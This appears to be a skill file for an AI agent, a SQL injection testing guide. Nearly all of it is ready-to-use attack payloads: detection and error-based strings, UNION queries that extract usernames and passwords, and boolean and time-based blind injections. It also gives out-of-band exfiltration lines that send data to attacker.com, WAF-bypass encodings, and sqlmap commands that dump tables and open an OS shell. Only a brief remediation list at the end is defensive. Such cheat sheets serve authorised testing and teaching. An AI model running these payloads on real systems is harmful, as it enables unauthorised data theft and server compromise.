---
name: sql-injection
description: SQL Injection attack techniques and payloads
tags: [sqli, injection, database, web]
version: "1.0"
---

# SQL Injection Testing Guide

## Detection Payloads

### Basic Detection
```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
```

### Error-Based Detection
```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
extractvalue(1,concat(0x7e,(select @@version)))
updatexml(1,concat(0x7e,(select @@version)),1)
```

## Database Fingerprinting

| Database | Version Query |
|----------|---------------|
| MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |
| SQLite | `SELECT sqlite_version()` |

## Union-Based Injection

### Step 1: Find Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 2: Find Displayable Column
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Step 3: Extract Data
```sql
-- MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- MSSQL
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
```

## Blind SQL Injection

### Boolean-Based
```sql
' AND 1=1--     (true)
' AND 1=2--     (false)
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>97--
```

### Time-Based
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

## Out-of-Band (OOB) Techniques

### DNS Exfiltration
```sql
-- MySQL
SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'));

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\a'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual;
```

## WAF Bypass Techniques

### Case Manipulation
```sql
SeLeCt, UNION, uNiOn
```

### Comment Injection
```sql
UN/**/ION SE/**/LECT
/*!UNION*/ /*!SELECT*/
```

### Encoding
```sql
%55NION %53ELECT (URL encoding)
CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78) (char encoding)
```

### Alternative Syntax
```sql
UNION ALL SELECT instead of UNION SELECT
|| instead of CONCAT
```

## SQLMap Commands

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user

# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# OS Shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

## Remediation

1. **Parameterized Queries** (Prepared Statements)
2. **Input Validation** (Whitelist approach)
3. **Least Privilege** (Database permissions)
4. **WAF Rules** (Defense in depth)
5. **Error Handling** (Generic messages)
